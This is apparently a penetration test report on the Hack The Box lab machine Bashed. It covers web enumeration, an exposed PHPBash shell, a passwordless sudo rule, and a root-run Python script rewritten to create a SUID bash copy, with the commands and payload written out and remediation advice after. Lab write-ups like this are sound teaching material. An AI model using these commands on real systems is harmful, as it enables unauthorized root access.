# Bashed Penetration Test Report

## Executive Summary

A penetration test was conducted against the Hack The Box machine Bashed to assess the security of its externally accessible services and identify attack paths that could lead to full system compromise.

The assessment identified multiple weaknesses that could be chained together. Initial web enumeration revealed a publicly accessible development directory containing PHPBash, a browser-based PHP command shell. The application required no authentication and allowed operating system commands to be executed directly as the Apache service account `www-data`.

Post-exploitation enumeration revealed that `www-data` could execute arbitrary commands as the local user `scriptmanager` through an unrestricted passwordless sudo rule. After transitioning to the `scriptmanager` account, further enumeration identified a Python script under `/scripts` that was writable by `scriptmanager` but executed within a root security context.

By modifying the root-executed Python script, attacker-controlled commands were executed with root privileges. This resulted in the creation of a SUID-enabled Bash binary and complete compromise of the target.

The successful attack path was:

**Web Enumeration → Exposed PHPBash → Unauthenticated Command Execution → www-data → Passwordless Sudo → scriptmanager → Writable Root-Executed Script → SUID Bash → Root**

---

## Assessment Scope

| Item | Details |
|---|---|
| Target | Bashed |
| Platform | Hack The Box |
| Target IP | 10.129.54.35 |
| Hostname | bashed.htb |
| Operating System | Linux |
| Assessment Type | Black-box penetration test |
| Assessment Date | 5 September 2026 |

The objective of the assessment was to identify vulnerabilities affecting the target, validate their practical impact and determine whether they could be chained to achieve full system compromise.

Testing was restricted to the designated Hack The Box target and supporting attacker infrastructure used during the assessment.

---

## Methodology

The assessment followed a structured penetration testing methodology covering reconnaissance, vulnerability identification, exploitation, post-exploitation enumeration and privilege escalation.

### Reconnaissance

The target was examined to identify exposed services, web content and potentially sensitive resources.

Tools and techniques included:

- Nmap service enumeration
- Manual HTTP inspection
- Gobuster directory enumeration
- Web application analysis
- Local Linux enumeration
- Sudo permission analysis
- File ownership and permission analysis

### Vulnerability Identification

Discovered services and local system configurations were reviewed for:

- Exposed development functionality
- Unauthenticated command execution
- Excessive sudo permissions
- Accessible local accounts and resources
- Insecure file ownership
- Writable privileged scripts
- Root-executed automation

### Exploitation

Exploitation involved:

- Accessing the exposed PHPBash application
- Executing operating system commands as `www-data`
- Abusing passwordless sudo permissions to execute commands as `scriptmanager`
- Establishing a more stable shell under the `scriptmanager` account

### Post-Exploitation Enumeration

After obtaining local access, enumeration focused on:

- Current user privileges
- Local user accounts
- Sudo permissions
- Accessible directories
- File ownership and permissions
- Scripts associated with privileged execution

### Privilege Escalation

Privilege escalation was achieved by modifying a Python script writable by `scriptmanager` that was being executed in a root security context.

The modified script created a SUID-enabled copy of Bash, which was then executed while preserving its effective user ID to obtain root-level access.

---

## Risk Rating

| Severity | Description |
|---|---|
| Critical | Vulnerability can directly or indirectly result in complete system compromise or root-level access. |
| High | Vulnerability can provide significant unauthorized access or an important step toward system compromise. |
| Medium | Vulnerability provides useful information or limited access that requires additional weaknesses to achieve significant impact. |
| Low | Vulnerability has limited direct security impact but may assist an attacker during enumeration. |
| Informational | Observation with minimal direct security impact but relevant to the overall security posture. |

---

## Findings Overview

| Finding ID | Finding | Severity |
|---|---|---|
| BAS-01 | Exposed PHPBash Web Shell | Critical |
| BAS-02 | Unrestricted Passwordless Sudo Access to `scriptmanager` | High |
| BAS-03 | Writable Script Executed with Root Privileges | Critical |

---

## Compromise Walkthrough

### 1. Reconnaissance and Web Enumeration

Initial network reconnaissance was performed to identify exposed services on the target.

```bash
nmap -sS -sC -sV -O -Pn -p1-10000 10.129.54.35
```

The scan identified a single accessible TCP service:

```text
80/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
```

With HTTP as the primary exposed attack surface, testing continued with web enumeration.

Directory discovery was performed using Gobuster:

```bash
gobuster dir -u http://bashed.htb -w /usr/share/wordlists/dirb/common.txt
```

Several accessible directories were identified, including:

```text
/dev
/uploads
/php
```

The `/dev` directory was particularly relevant because the main website contained a post describing a tool named PHPBash and stated that it had been developed on the same server.

Investigation of `/dev` revealed:

```text
phpbash.php
phpbash.min.php
```

The exposed `phpbash.php` application was directly accessible through the browser.

![PHPBash referenced on the target website](evidence/01-phpbash-discovery.png)

### 2. Initial Access Through PHPBash

The PHPBash interface provided operating system command execution without requiring authentication.

Command execution was verified using:

```bash
whoami
```

The server returned:

```text
www-data
```

![Unauthenticated command execution through PHPBash](evidence/02-phpbash-rce.png)

Additional enumeration confirmed that commands were executing in the context of the Apache service account:

```bash
id
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This established the initial foothold on the target.

Local enumeration also identified two user accounts of interest:

```text
arrexel
scriptmanager
```

![Local enumeration as www-data](evidence/03-www-data-local-enumeration.png)

The `www-data` account was also able to access resources associated with the local users, providing additional visibility into the underlying operating system.

### 3. Privilege Transition to scriptmanager

The sudo permissions available to `www-data` were reviewed:

```bash
sudo -l
```

The following rule was identified:

```text
User www-data may run the following commands on bashed:

(scriptmanager : scriptmanager) NOPASSWD: ALL
```

This configuration allowed the compromised web service account to execute arbitrary commands as `scriptmanager` without providing a password.

The privilege transition was confirmed with:

```bash
sudo -u scriptmanager whoami
```

Output:

```text
scriptmanager
```

The account context was further verified with:

```bash
sudo -u scriptmanager id
```

Output:

```text
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

A reverse shell was subsequently established as `scriptmanager` to provide a more stable interactive session for further enumeration.

### 4. Privileged Script Discovery

After obtaining access as `scriptmanager`, the `/scripts` directory became accessible.

![Passwordless sudo access and privileged script exposure](evidence/04-sudo-and-root-script.png)

The directory contained:

```text
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4 2017 test.py
-rw-r--r-- 1 root          root          12 Sep  5 06:24 test.txt
```

The contents of `test.py` were reviewed:

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

The Python script was owned and writable by `scriptmanager`, while the file generated by the script was owned by root.

The root ownership of `test.txt`, together with its repeated modification, demonstrated that `test.py` was being executed within a privileged root context.

Because `scriptmanager` controlled the contents of the script, arbitrary commands could be introduced and later executed with root privileges.

### 5. Root Privilege Escalation

Before modifying the script, a backup was created:

```bash
cp /scripts/test.py /tmp/test.py.bak
```

The script was then modified to create a SUID-enabled copy of `/bin/bash`:

```python
import os
os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")
```

After the privileged task executed, the resulting binary was inspected:

```bash
ls -l /tmp/rootbash
```

The file was owned by root and had the SUID permission set:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

The binary was executed while preserving the effective user ID:

```bash
/tmp/rootbash -p
```

Root-level access was successfully obtained.

![Successful root privilege escalation](evidence/05-root-privilege-escalation.png)

Access to `/root` confirmed complete compromise of the target host.

### Complete Attack Path

```text
HTTP Service
    ↓
Web Enumeration
    ↓
/dev Directory
    ↓
Exposed PHPBash
    ↓
Unauthenticated Command Execution
    ↓
www-data
    ↓
Passwordless Sudo
    ↓
scriptmanager
    ↓
/scripts/test.py
    ↓
Writable Root-Executed Python Script
    ↓
SUID Bash Creation
    ↓
Root
```

---

## Technical Findings

### BAS-01 — Exposed PHPBash Web Shell

**Severity:** Critical

**Affected Asset:** `/dev/phpbash.php`

#### Description

A PHP command shell was exposed through a publicly accessible development directory.

The application required no authentication and provided direct operating system command execution through the web browser.

The presence of the development utility was also disclosed by the public website, which referenced PHPBash and stated that it had been developed on the target server.

An attacker able to reach the web application could therefore discover the development directory and execute commands on the underlying operating system.

#### Evidence

- `evidence/01-phpbash-discovery.png`
- `evidence/02-phpbash-rce.png`
- `evidence/03-www-data-local-enumeration.png`

Command execution through the exposed interface returned:

```text
www-data
```

confirming unauthenticated operating system command execution in the context of the Apache service account.

#### Impact

An unauthenticated remote attacker could execute operating system commands and obtain an initial foothold on the server.

Although the initial execution context was limited to `www-data`, access to the underlying operating system enabled local enumeration and exposed the subsequent privilege escalation path.

#### Root Cause

Development tooling was deployed within a publicly accessible web directory without authentication or access restrictions.

#### Recommendation

Remove development utilities and web shells from publicly accessible web directories.

Development resources should not be deployed to production-facing systems. Where administrative or development functionality is required, access should be restricted using appropriate authentication and network-level controls.

The web root should also be reviewed for additional development, diagnostic or backup files that expose unnecessary functionality.

---

### BAS-02 — Unrestricted Passwordless Sudo Access to scriptmanager

**Severity:** High

**Affected Asset:** `www-data` sudo configuration

#### Description

The compromised `www-data` account was permitted to execute arbitrary commands as `scriptmanager` without providing a password.

The identified sudo rule was:

```text
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

Because `ALL` was permitted, there was no meaningful restriction on which commands could be executed within the `scriptmanager` security context.

#### Evidence

- `evidence/04-sudo-and-root-script.png`

Running:

```bash
sudo -l
```

revealed unrestricted passwordless access to the `scriptmanager` account.

The privilege transition was confirmed using:

```bash
sudo -u scriptmanager whoami
```

which returned:

```text
scriptmanager
```

#### Impact

An attacker who obtained command execution through the web application could immediately transition from the restricted web service account to `scriptmanager`.

This provided access to additional local files and directories and exposed the root privilege escalation path through `/scripts/test.py`.

#### Root Cause

The sudo configuration granted the web service account unrestricted passwordless command execution as another local user instead of limiting access to specific required commands.

#### Recommendation

Remove unrestricted `NOPASSWD: ALL` sudo permissions.

If the web service genuinely requires execution under another account, permissions should be restricted to the minimum commands required for legitimate functionality.

Sudo rules should be reviewed regularly and configured according to the principle of least privilege.

---

### BAS-03 — Writable Script Executed with Root Privileges

**Severity:** Critical

**Affected Asset:** `/scripts/test.py`

#### Description

The `scriptmanager` account had write access to a Python script that was executed within a root security context.

The script:

```text
/scripts/test.py
```

was owned by `scriptmanager`, while the file generated by the script was owned by root.

This demonstrated that a lower-privileged user controlled the contents of code executed with administrative privileges.

The script was modified to create a SUID-enabled copy of `/bin/bash`. When the privileged process subsequently executed the modified script, the attacker-controlled commands ran as root.

#### Evidence

- `evidence/04-sudo-and-root-script.png`
- `evidence/05-root-privilege-escalation.png`

File permissions showed:

```text
-rw-r--r-- 1 scriptmanager scriptmanager ... test.py
-rw-r--r-- 1 root          root          ... test.txt
```

Following execution of the modified script, the resulting binary was:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Executing:

```bash
/tmp/rootbash -p
```

provided effective root access.

#### Impact

An attacker with access to `scriptmanager` could execute arbitrary commands with root privileges.

Successful exploitation resulted in complete compromise of the operating system, including access to protected files, system configuration and other sensitive resources available to the root account.

#### Root Cause

A lower-privileged user was permitted to modify a script that was executed in a privileged root context.

#### Recommendation

All scripts executed with root privileges should be owned by root and must not be writable by lower-privileged accounts.

The `/scripts` directory and other locations containing privileged automation should be reviewed for insecure ownership and permissions.

Scheduled tasks and cron jobs should also be audited to ensure that both executable files and their parent directories cannot be modified by unprivileged users.

File integrity monitoring should be considered for scripts and binaries executed in privileged contexts.

---

## Remediation Summary

1. **Remove the exposed PHPBash application** and review the web root for additional development or diagnostic files.

2. **Remove unrestricted passwordless sudo permissions** assigned to the `www-data` account.

3. **Restrict sudo permissions according to least privilege** and permit only explicitly required commands.

4. **Ensure root-executed scripts are owned and writable only by root.**

5. **Review scheduled tasks and privileged automation** for insecure file and directory permissions.

6. **Separate development resources from externally accessible web content.**

7. **Review web server permissions** to reduce the impact of compromise of the service account.

---

## Limitations

The assessment was conducted against a single designated Hack The Box target within an authorized lab environment.

Testing focused on identifying and validating a practical attack path from unauthenticated external access to full system compromise.

The assessment did not include:

- Denial-of-service testing
- Persistence mechanisms
- Destructive actions
- Testing of systems outside the designated target
- Long-term monitoring
- Social engineering

Sensitive flag values obtained during the assessment have intentionally been excluded from this public report.

---

## Conclusion

The Bashed host was fully compromised through a chain of three security weaknesses involving exposed development functionality, excessive sudo permissions and insecure privileged script execution.

Initial web enumeration identified a publicly accessible PHPBash instance that provided unauthenticated command execution as `www-data`.

Local enumeration then revealed an unrestricted passwordless sudo rule that allowed arbitrary commands to be executed as `scriptmanager`. Access to this account exposed `/scripts/test.py`, a Python script writable by `scriptmanager` but executed within a root security context.

The script was modified to create a SUID-enabled Bash binary. When the privileged process executed the modified script, the resulting binary provided effective root access and complete compromise of the host.

The successful attack chain was:

```text
Web Enumeration
    ↓
Exposed PHPBash
    ↓
Unauthenticated Command Execution
    ↓
www-data
    ↓
Passwordless Sudo
    ↓
scriptmanager
    ↓
Writable Root-Executed Python Script
    ↓
SUID Bash
    ↓
Root-Level Access
    ↓
Complete System Compromise
```
